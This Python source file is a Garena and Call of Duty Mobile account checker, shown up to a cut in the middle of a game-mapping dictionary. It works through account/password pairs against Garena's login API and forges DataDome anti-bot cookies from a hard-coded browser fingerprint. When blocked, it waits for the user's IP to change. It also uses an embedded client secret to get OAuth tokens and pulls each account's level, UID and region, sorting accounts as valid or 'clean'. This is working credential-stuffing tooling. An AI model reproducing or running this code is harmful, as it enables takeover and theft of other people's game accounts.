import os
import sys
import time
import random
import hashlib
import json
import logging
import urllib.parse
import signal
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from threading import Lock
from Crypto.Cipher import AES
import requests
import cloudscraper
import colorama
import threading
from colorama import Fore, Style, Back
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.box import Box, DOUBLE
from rich.live import Live
from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn

colorama.init(autoreset=True)
console = Console()


class Colors:
    LIGHTGREEN_EX = colorama.Fore.LIGHTGREEN_EX
    WHITE = colorama.Fore.WHITE
    BLUE = colorama.Fore.LIGHTBLUE_EX
    GREEN = colorama.Fore.GREEN
    RED = colorama.Fore.LIGHTRED_EX
    CYAN = colorama.Fore.CYAN
    LIGHTBLACK_EX = colorama.Fore.LIGHTBLACK_EX
    RESET = colorama.Style.RESET_ALL


class ColoredFormatter(logging.Formatter):
    COLORS = {
        'DEBUG': '\033[38;5;75m',
        'INFO': '\033[38;5;250m',
        'WARNING': '\033[38;5;220m',
        'ERROR': '\033[38;5;203m',
        'CRITICAL': '\033[1;41m\033[97m',
        'ORANGE': '\033[38;5;208m',
        'PURPLE': '\033[38;5;177m',
        'CYAN': '\033[38;5;87m',
        'SUCCESS': '\033[38;5;82m',
        'FAIL': '\033[38;5;160m'
    }

    RESET = colorama.Style.RESET_ALL

    def format(self, record):
        color = self.COLORS.get(record.levelname, "")
        message = super().format(record)
        return f"{color}{message}{self.RESET}"


logger = logging.getLogger()
handler = logging.StreamHandler()
handler.setFormatter(ColoredFormatter())
logger.addHandler(handler)
logger.setLevel(logging.DEBUG)

logging.getLogger("urllib3").setLevel(logging.ERROR)
logging.getLogger("requests").setLevel(logging.ERROR)

class GracefulThreadPoolExecutor(ThreadPoolExecutor):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._shutdown = False
        
    def shutdown(self, wait=True, *, cancel_futures=False):
        self._shutdown = True
        super().shutdown(wait=wait, cancel_futures=cancel_futures)

import os
import random

class CookieManager:
    def __init__(self):
        self.banned_cookies = set()
        self.load_banned_cookies()
    
    def load_banned_cookies(self):
        """Load banned cookies from banned_cookies.txt"""
        if os.path.exists('banned_cookies.txt'):
            with open('banned_cookies.txt', 'r') as f:
                self.banned_cookies = set(line.strip() for line in f if line.strip())
    
    def is_banned(self, cookie):
        return cookie in self.banned_cookies
    
    def mark_banned(self, cookie):
        """Mark a cookie as banned"""
        if cookie not in self.banned_cookies:
            self.banned_cookies.add(cookie)
            with open('banned_cookies.txt', 'a') as f:
                f.write(cookie + '\n')
    
    def save_cookie(self, cookie):
        """Save cookie to fresh_cookies.txt if not banned"""
        if not self.is_banned(cookie):
            with open('fresh_cookies.txt', 'a') as f:
                f.write(cookie + '\n')
            return True
        return False
    
    def get_valid_cookie(self):
        """
        Return a valid cookie:
        - If fresh_cookie.txt exists → use it
        - If missing → treat as “nasunog”, move its contents to banned, then use fresh_cookies.txt
        """
        cookies = []

        if os.path.exists('fresh_cookie.txt'):
            # fresh_cookie.txt exists → read normally
            with open('fresh_cookie.txt', 'r') as f:
                cookies = [c.strip() for c in f if c.strip()]
        else:
            # fresh_cookie.txt missing → nasunog!
            print("fresh_cookie.txt missing! Switching to fresh_cookies.txt...")
            # Attempt to read old cookies if somehow file still exists (edge case)
            # Then move all to banned
            # (Since file is missing, nothing to move here)
            
            # Read from fresh_cookies.txt
            if os.path.exists('fresh_cookies.txt'):
                with open('fresh_cookies.txt', 'r') as f:
                    cookies = [c.strip() for c in f if c.strip()]
            else:
                return None

        # Filter out banned cookies
        valid_cookies = [c for c in cookies if not self.is_banned(c)]
        return random.choice(valid_cookies) if valid_cookies else None

class DataDomeManager:
    def __init__(self):
        self.current_datadome = None
        self.datadome_history = []
        self._403_attempts = 0
        
    def set_datadome(self, datadome_cookie):
        if datadome_cookie and datadome_cookie != self.current_datadome:
            self.current_datadome = datadome_cookie
            self.datadome_history.append(datadome_cookie)
            if len(self.datadome_history) > 10:
                self.datadome_history.pop(0)
            
    def get_datadome(self):
        return self.current_datadome
        
    def extract_datadome_from_session(self, session):
        try:
            cookies_dict = session.cookies.get_dict()
            datadome_cookie = cookies_dict.get('datadome')
            if datadome_cookie:
                self.set_datadome(datadome_cookie)
                return datadome_cookie
            return None
        except Exception as e:
            logger.warning(f"[WARNING] Error extracting datadome from session: {e}")
            return None
        
    def clear_session_datadome(self, session):
        try:
            if 'datadome' in session.cookies:
                del session.cookies['datadome']
        except Exception as e:
            logger.warning(f"[WARNING] Error clearing datadome cookies: {e}")
        
    def set_session_datadome(self, session, datadome_cookie=None):
        try:
            self.clear_session_datadome(session)
            cookie_to_use = datadome_cookie or self.current_datadome
            if cookie_to_use:
                session.cookies.set('datadome', cookie_to_use, domain='.garena.com')
                return True
            return False
        except Exception as e:
            logger.warning(f"[WARNING] Error setting datadome cookie: {e}")
            return False

    def get_current_ip(self):
        """Get current public IP address with multiple fallback services"""
        ip_services = [
            'https://api.ipify.org',
            'https://icanhazip.com',
            'https://ident.me',
            'https://checkip.amazonaws.com'
        ]
        
        for service in ip_services:
            try:
                response = requests.get(service, timeout=10)
                if response.status_code == 200:
                    ip = response.text.strip()
                    if ip and '.' in ip:  
                        return ip
            except Exception:
                continue
        
        logger.warning(f"[WARNING] Could not fetch IP from any service")
        return None

    def wait_for_ip_change(self, session, check_interval=5, max_wait_time=200):
        """Wait for IP address to change AUTOMATICALLY"""
        logger.info(f"[𝙄𝙉𝙁𝙊] Auto-detecting IP change...")
        
        original_ip = self.get_current_ip()
        if not original_ip:
            logger.warning(f"[WARNING] Could not determine current IP, waiting 60 seconds")
            time.sleep(10)
            return True
            
        logger.info(f"[𝙄𝙉𝙁𝙊] Current IP: {original_ip}")
        logger.info(f"[𝙄𝙉𝙁𝙊] Waiting for IP change (checking every {check_interval} seconds, max {max_wait_time//60} minutes)...")
        
        start_time = time.time()
        attempts = 0
        
        while time.time() - start_time < max_wait_time:
            attempts += 1
            current_ip = self.get_current_ip()
            
            if current_ip and current_ip != original_ip:
                logger.info(f"[SUCCESS] IP changed from {original_ip} to {current_ip}")
                logger.info(f"[𝙄𝙉𝙁𝙊] IP changed successfully after {attempts} checks!")
                return True
            else:
                if attempts % 5 == 0:  
                    logger.info(f"[𝙄𝙉𝙁𝙊] IP check {attempts}: Still {original_ip} -> Auto-retrying...")
                time.sleep(check_interval)
        
        logger.warning(f"[WARNING] IP did not change after {max_wait_time} seconds")
        return False

    def handle_403(self, session):
        self._403_attempts += 1
        
        if self._403_attempts >= 3:
            logger.error(f"[ERROR] IP blocked after 3 attempts.")
            logger.error(f"[𝙄𝙉𝙁𝙊] Network fix: WiFi -> Use VPN | Mobile Data -> Toggle Airplane Mode")
            logger.info(f"[𝙄𝙉𝙁𝙊] Auto-detecting IP change...")
            
            if self.wait_for_ip_change(session):
                logger.info(f"[SUCCESS] IP changed, fetching new DataDome cookie...")
                
                self._403_attempts = 0
                
                new_datadome = get_datadome_cookie(session)
                if new_datadome:
                    self.set_datadome(new_datadome)
                    logger.info(f"[SUCCESS] New DataDome cookie obtained")
                    return True
                else:
                    logger.error(f"[ERROR] Failed to fetch new DataDome after IP change")
                    return False
            else:
                logger.error(f"[ERROR] IP did not change, cannot continue")
                return False
        return False
        
import threading
from rich.console import Console
from rich.panel import Panel
from rich.box import DOUBLE

console = Console()

class LiveStats:
    def __init__(self):
        self.valid_count = 0
        self.invalid_count = 0
        self.clean_count = 0
        self.not_clean_count = 0
        self.has_codm_count = 0
        self.no_codm_count = 0
        self.level_data = []  # store each account's level and clean status
        self.lock = threading.Lock()

    def update_stats(self, valid=False, clean=False, has_codm=False, level=None):
        """Update live stats for each account."""
        with self.lock:
            if valid:
                self.valid_count += 1
                if clean:
                    self.clean_count += 1
                else:
                    self.not_clean_count += 1

                if has_codm:
                    self.has_codm_count += 1
                else:
                    self.no_codm_count += 1

                # Store level for range summary
                if level is not None:
                    self.level_data.append({"level": level, "clean": clean})
            else:
                self.invalid_count += 1

    def get_stats(self):
        """Return current counts as a dictionary."""
        with self.lock:
            return {
                'valid': self.valid_count,
                'invalid': self.invalid_count,
                'clean': self.clean_count,
                'not_clean': self.not_clean_count,
                'has_codm': self.has_codm_count,
                'no_codm': self.no_codm_count
            }

    def display_stats(self):
        """Return formatted live stats string."""
        stats = self.get_stats()
        bright_blue = '\033[94m'
        reset_color = '\033[0m'
        return (
            f"{bright_blue}[LIVE STATS] VALID [{stats['valid']}] | INVALID [{stats['invalid']}] | "
            f"CLEAN [{stats['clean']}] | NOT CLEAN [{stats['not_clean']}] | "
            f"HAS CODM [{stats['has_codm']}] | NO CODM [{stats['no_codm']}] -> config @LEGIThea{reset_color}"
        )
        
def encode(plaintext, key):
    key = bytes.fromhex(key)
    plaintext = bytes.fromhex(plaintext)
    cipher = AES.new(key, AES.MODE_ECB)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext.hex()[:32]

def get_passmd5(password):
    decoded_password = urllib.parse.unquote(password)
    return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()

def hash_password(password, v1, v2):
    passmd5 = get_passmd5(password)
    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
    return encode(passmd5, outer_hash)

def applyck(session, cookie_str):
    session.cookies.clear()
    cookie_dict = {}
    for item in cookie_str.split(";"):
        item = item.strip()
        if '=' in item:
            try:
                key, value = item.split("=", 1)
                key = key.strip()
                value = value.strip()
                if key and value:
                    cookie_dict[key] = value
            except (ValueError, IndexError):
                logger.warning(f"[WARNING] Skipping invalid cookie component: {item}")
        else:
            logger.warning(f"[WARNING] Skipping malformed cookie (no '='): {item}")
    
    if cookie_dict:
        session.cookies.update(cookie_dict)
        logger.info(f"[SUCCESS] Applied {len(cookie_dict)} cookies")
    else:
        logger.warning(f"[WARNING] No valid cookies found in the provided string")

def get_datadome_cookie(session):
    url = 'https://dd.garena.com/js/'
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    }
    
    payload = {
        'jsData': json.dumps({
            "ttst":76.70000004768372,"ifov":False,"hc":4,"br_oh":824,"br_ow":1536,"ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36","wbd":False,"dp0":True,"tagpu":5.738121195951787,"wdif":False,"wdifrm":False,"npmtm":False,"br_h":738,"br_w":260,"isf":False,"nddc":1,"rs_h":864,"rs_w":1536,"rs_cd":24,"phe":False,"nm":False,"jsf":False,"lg":"en-US","pr":1.25,"ars_h":824,"ars_w":1536,"tz":-480,"str_ss":True,"str_ls":True,"str_idb":True,"str_odb":False,"plgod":False,"plg":5,"plgne":True,"plgre":True,"plgof":False,"plggt":False,"pltod":False,"hcovdr":False,"hcovdr2":False,"plovdr":False,"plovdr2":False,"ftsovdr":False,"ftsovdr2":False,"lb":False,"eva":33,"lo":False,"ts_mtp":0,"ts_tec":False,"ts_tsa":False,"vnd":"Google Inc.","bid":"NA","mmt":"application/pdf,text/pdf","plu":"PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF","hdn":False,"awe":False,"geb":False,"dat":False,"med":"defined","aco":"probably","acots":False,"acmp":"probably","acmpts":True,"acw":"probably","acwts":False,"acma":"maybe","acmats":False,"acaa":"probably","acaats":True,"ac3":"","ac3ts":False,"acf":"probably","acfts":False,"acmp4":"maybe","acmp4ts":False,"acmp3":"probably","acmp3ts":False,"acwm":"maybe","acwmts":False,"ocpt":False,"vco":"","vcots":False,"vch":"probably","vchts":True,"vcw":"probably","vcwts":True,"vc3":"maybe","vc3ts":False,"vcmp":"","vcmpts":False,"vcq":"maybe","vcqts":False,"vc1":"probably","vc1ts":True,"dvm":8,"sqt":False,"so":"landscape-primary","bda":False,"wdw":True,"prm":True,"tzp":True,"cvs":True,"usb":True,"cap":True,"tbf":False,"lgs":True,"tpd":True
        }),
        'eventCounters': '[]',
        'jsType': 'ch',
        'cid': 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
        'ddk': 'AE3F04AD3F0D3A462481A337485081',
        'Referer': 'https://account.garena.com/',
        'request': '/',
        'responsePage': 'origin',
        'ddv': '4.35.4'
    }

    data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())

    try:
        response = requests.post(url, headers=headers, data=data)
        response.raise_for_status()
        response_json = response.json()
        
        if response_json['status'] == 200 and 'cookie' in response_json:
            cookie_string = response_json['cookie']
            datadome = cookie_string.split(';')[0].split('=')[1]
            return datadome
        else:
            print(f"{ERROR_RED}DataDome cookie not found in response. Status code: {response_json['status']}")
            return None
    except requests.exceptions.RequestException as e:
        print(f"{ERROR_RED}Error getting DataDome cookie: {e}")
        return None

def prelogin(session, account, datadome_manager):
    url = 'https://sso.garena.com/api/prelogin'
    params = {
        'app_id': '10100',
        'account': account,
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }
    
    retries = 3
    for attempt in range(retries):
        try:
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            
            for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
                if cookie_name in current_cookies:
                    cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
            
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
            
            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br, zstd',
                'accept-language': 'en-US,en;q=0.9',
                'connection': 'keep-alive',
                'host': 'sso.garena.com',
                'referer': f'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-SG&account={account}',
                'sec-ch-ua': '"Google Chrome";v="133", "Chromium";v="133", "Not=A?Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
            }
            
            if cookie_header:
                headers['cookie'] = cookie_header
            
            logger.info(f"[PRELOGIN] Attempt {attempt + 1}/{retries} for {account}")
            
            response = session.get(url, headers=headers, params=params, timeout=30)
            
            new_cookies = {}
            
            if 'set-cookie' in response.headers:
                set_cookie_header = response.headers['set-cookie']
                
                for cookie_str in set_cookie_header.split(','):
                    if '=' in cookie_str:
                        try:
                            cookie_name = cookie_str.split('=')[0].strip()
                            cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                            if cookie_name and cookie_value:
                                new_cookies[cookie_name] = cookie_value
                        except Exception as e:
                            pass
            
            try:
                response_cookies = response.cookies.get_dict()
                for cookie_name, cookie_value in response_cookies.items():
                    if cookie_name not in new_cookies:
                        new_cookies[cookie_name] = cookie_value
            except Exception as e:
                pass
            
            for cookie_name, cookie_value in new_cookies.items():
                if cookie_name in ['datadome', 'apple_state_key', 'sso_key']:
                    session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
                    if cookie_name == 'datadome':
                        datadome_manager.set_datadome(cookie_value)
            
            new_datadome = new_cookies.get('datadome')
            
            if response.status_code == 403:
                logger.error(f"[ERROR] 403 Forbidden during prelogin for {account} (attempt {attempt + 1}/{retries})")
                
                if new_cookies and attempt < retries - 1:
                    logger.info(f"[RETRY] Got new cookies from 403, retrying...")
                    time.sleep(2)
                    continue
                
                if datadome_manager.handle_403(session):
                    return "IP_BLOCKED", None, None
                else:
                    logger.error(f"[ERROR] Cannot continue with {account} due to IP block")
                    return None, None, new_datadome
                
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return None, None, new_datadome
            
            response.raise_for_status()
            
            try:
                data = response.json()
            except json.JSONDecodeError:
                logger.error(f"[ERROR] Invalid JSON response from prelogin for {account}")
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return None, None, new_datadome
            
            if 'error' in data:
                logger.error(f"[ERROR] Prelogin error for {account}: {data['error']}")
                return None, None, new_datadome
                
            v1 = data.get('v1')
            v2 = data.get('v2')
            
            if not v1 or not v2:
                logger.error(f"[ERROR] Missing v1 or v2 in prelogin response for {account}")
                return None, None, new_datadome
                
            logger.info(f"[SUCCESS] Prelogin successful: {account}")
            
            return v1, v2, new_datadome
            
        except requests.exceptions.HTTPError as e:
            if hasattr(e, 'response') and e.response is not None:
                if e.response.status_code == 403:
                    logger.error(f"[ERROR] 403 Forbidden during prelogin for {account} (attempt {attempt + 1}/{retries})")
                    
                    new_cookies = {}
                    if 'set-cookie' in e.response.headers:
                        set_cookie_header = e.response.headers['set-cookie']
                        for cookie_str in set_cookie_header.split(','):
                            if '=' in cookie_str:
                                try:
                                    cookie_name = cookie_str.split('=')[0].strip()
                                    cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                                    if cookie_name and cookie_value:
                                        new_cookies[cookie_name] = cookie_value
                                        session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
                                        if cookie_name == 'datadome':
                                            datadome_manager.set_datadome(cookie_value)
                                except Exception as ex:
                                    pass
                    
                    if new_cookies and attempt < retries - 1:
                        logger.info(f"[RETRY] Retrying with new cookies from 403...")
                        time.sleep(2)
                        continue
                    
                    if datadome_manager.handle_403(session):
                        return "IP_BLOCKED", None, None
                    else:
                        logger.error(f"[ERROR] Cannot continue with {account} due to IP block")
                        return None, None, new_cookies.get('datadome')
                        
                    if attempt < retries - 1:
                        time.sleep(2)
                        continue
                    return None, None, new_cookies.get('datadome')
                else:
                    logger.error(f"[ERROR] HTTP error {e.response.status_code} fetching prelogin data for {account} (attempt {attempt + 1}/{retries}): {e}")
            else:
                logger.error(f"[ERROR] HTTP error fetching prelogin data for {account} (attempt {attempt + 1}/{retries}): {e}")
                
            if attempt < retries - 1:
                time.sleep(2)
                continue
        except Exception as e:
            logger.error(f"[ERROR] Error fetching prelogin data for {account} (attempt {attempt + 1}/{retries}): {e}")
            if attempt < retries - 1:
                time.sleep(2)
                
    return None, None, None

def login(session, account, password, v1, v2):
    hashed_password = hash_password(password, v1, v2)
    url = 'https://sso.garena.com/api/login'
    params = {
        'app_id': '10100',
        'account': account,
        'password': hashed_password,
        'redirect_uri': 'https://account.garena.com/',
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }
    
    current_cookies = session.cookies.get_dict()
    cookie_parts = []
    for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
        if cookie_name in current_cookies:
            cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
    cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
    
    headers = {
        'accept': 'application/json, text/plain, */*',
        'referer': 'https://account.garena.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
    }
    
    if cookie_header:
        headers['cookie'] = cookie_header
    
    retries = 3
    for attempt in range(retries):
        try:
            response = session.get(url, headers=headers, params=params, timeout=30)
            response.raise_for_status()
            
            login_cookies = {}
            
            if 'set-cookie' in response.headers:
                set_cookie_header = response.headers['set-cookie']
                for cookie_str in set_cookie_header.split(','):
                    if '=' in cookie_str:
                        try:
                            cookie_name = cookie_str.split('=')[0].strip()
                            cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                            if cookie_name and cookie_value:
                                login_cookies[cookie_name] = cookie_value
                        except Exception as e:
                            pass
            
            try:
                response_cookies = response.cookies.get_dict()
                for cookie_name, cookie_value in response_cookies.items():
                    if cookie_name not in login_cookies:
                        login_cookies[cookie_name] = cookie_value
            except Exception as e:
                pass
            
            for cookie_name, cookie_value in login_cookies.items():
                if cookie_name in ['sso_key', 'apple_state_key', 'datadome']:
                    session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
            
            try:
                data = response.json()
            except json.JSONDecodeError:
                logger.error(f"[ERROR] Invalid JSON response from login for {account}")
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return None
            
            sso_key = login_cookies.get('sso_key') or response.cookies.get('sso_key')
            
            if 'error' in data:
                error_msg = data['error']
                logger.error(f"[ERROR] Login failed for {account}: {error_msg}")
                
                if error_msg == 'ACCOUNT DOESNT EXIST':
                    logger.warning(f"[WARNING] Authentication error - likely invalid credentials for {account}")
                    return None
                elif 'captcha' in error_msg.lower():
                    logger.warning(f"[WARNING] Captcha required for {account}")
                    time.sleep(3)
                    continue
                    
            return sso_key
            
        except requests.RequestException as e:
            logger.error(f"[ERROR] Login request failed for {account} (attempt {attempt + 1}): {e}")
            if attempt < retries - 1:
                time.sleep(2)
                
    return None

def get_codm_access_token(session):
    random_id = str(int(time.time() * 1000))
    try:
        grant_url = "https://100082.connect.garena.com/oauth/token/grant"
        grant_headers = {
            "Host": "100082.connect.garena.com",
            "Connection": "keep-alive",
            "sec-ch-ua-platform": "\"Android\"",
            "User-Agent": "Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36; GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)",
            "Accept": "application/json, text/plain, */*",
            "sec-ch-ua": "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Android WebView\";v=\"144\"",
            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "Origin": "https://100082.connect.garena.com",
            "X-Requested-With": "com.garena.game.codm",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9",
        }

        grant_body = {
            "client_id": "100082",
            "response_type": "code",
            "redirect_uri": "gop100082://auth/",
            "create_grant": "true",
            "login_scenario": "normal",
            "format": "json",
            "id": random_id,
        }

        grant_resp = session.post(
            grant_url,
            headers=grant_headers,
            data=urllib.parse.urlencode(grant_body),
            timeout=30,
        )
        grant_resp.raise_for_status()
        grant_data = grant_resp.json()
        auth_code = grant_data.get("code")

        if not auth_code:
            raise ValueError("No authorization code in CODM grant response")

        exchange_url = "https://100082.connect.garena.com/oauth/token/exchange"
        exchange_headers = {
            "User-Agent": "GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)",
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": "100082.connect.garena.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
        }
        exchange_body = {
            "grant_type": "authorization_code",
            "code": auth_code,
            "device_id": "02-dc0cd806-a2b4-48ff-b5b5-0264b847352d",
            "redirect_uri": "gop100082://auth/",
            "source": "2",
            "client_id": "100082",
            "client_secret": "388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415",
        }

        exchange_resp = session.post(
            exchange_url,
            headers=exchange_headers,
            data=urllib.parse.urlencode(exchange_body),
            timeout=30,
        )
        exchange_resp.raise_for_status()
        exchange_data = exchange_resp.json()
        access_token = exchange_data.get("access_token", "")

        if access_token:
            return access_token

        raise ValueError("Empty access_token in CODM exchange response")

    except Exception as e:
        logger.error(f"[ERROR] Error getting CODM access token via 100082.connect.garena.com: {e}")
    try:
        token_url = "https://auth.garena.com/oauth/token/grant"
        token_headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": "https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/",
        }
        token_data = (
            "client_id=100082&response_type=token&redirect_uri="
            "https%3A%2F%2Fauth.codm.garena.com%2Fauth%2Fauth%2Fcallback_n%3Fsite%3Dhttps%3A%2F%2Fapi-delete-request.codm.garena.co.id%2Foauth%2Fcallback%2F&format=json&id="
            + random_id
        )

        token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=30)
        token_response.raise_for_status()
        token_json = token_response.json()
        return token_json.get("access_token", "")
    except Exception as e:
        logger.error(f"[ERROR] Error getting CODM access token via auth.garena.com fallback: {e}")
        return ""
        
def process_codm_callback(session, access_token):
    try:
        codm_callback_url = f"https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/&access_token={access_token}"
        callback_headers = {
            "authority": "auth.codm.garena.com",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "referer": "https://auth.garena.com/",
            "sec-ch-ua": "\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-site",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        callback_response = session.get(codm_callback_url, headers=callback_headers, allow_redirects=False)
        
        api_callback_url = f"https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token={access_token}"
        api_callback_headers = {
            "authority": "api-delete-request.codm.garena.co.id",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "referer": "https://auth.garena.com/",
            "sec-ch-ua": "\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "cross-site",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        api_callback_response = session.get(api_callback_url, headers=api_callback_headers, allow_redirects=False)
        location = api_callback_response.headers.get("Location", "")
        
        if "err=3" in location:
            return None, "no_codm"
        elif "token=" in location:
            token = location.split("token=")[-1].split('&')[0]
            return token, "success"
        else:
            return None, "unknown_error"
            
    except Exception as e:
        logger.error(f"[ERROR] Error processing CODM callback: {e}")
        return None, "error"

def get_codm_user_info(session, token):
    try:
        check_login_url = "https://api-delete-request.codm.garena.co.id/oauth/check_login/"
        check_headers = {
            "authority": "api-delete-request.codm.garena.co.id",
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-US,en;q=0.9",
            "accept-encoding": "gzip, deflate, br, zstd",
            "cache-control": "no-cache",
            "codm-delete-token": token,
            "origin": "https://delete-request.codm.garena.co.id",
            "pragma": "no-cache",
            "referer": "https://delete-request.codm.garena.co.id/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        }
        
        check_response = session.get(check_login_url, headers=check_headers)
        check_data = check_response.json()
        
        user_data = check_data.get("user", {})
        if user_data:
            return {
                "codm_nickname": user_data.get("codm_nickname", "N/A"),
                "codm_level": user_data.get("codm_level", "N/A"),
                "region": user_data.get("region", "N/A"),
                "uid": user_data.get("uid", "N/A"),
                "open_id": user_data.get("open_id", "N/A"),
                "t_open_id": user_data.get("t_open_id", "N/A")
            }
        return {}
        
    except Exception as e:
        logger.error(f"❌ Error getting CODM user info: {e}")
        return {}
        

def get_game_connections(session, account):
    """
    Returns a list of game connection dicts:
      [{'region': 'PH', 'game': 'CODM', 'role': '123456'}, ...]
    If none found, returns empty list.
    """
    game_info = []
    valid_regions = {'sg', 'ph', 'my', 'tw', 'th', 'id', 'in', 'vn'}

    game_mappings = {
        'tw': {
            "100082": "CODM",
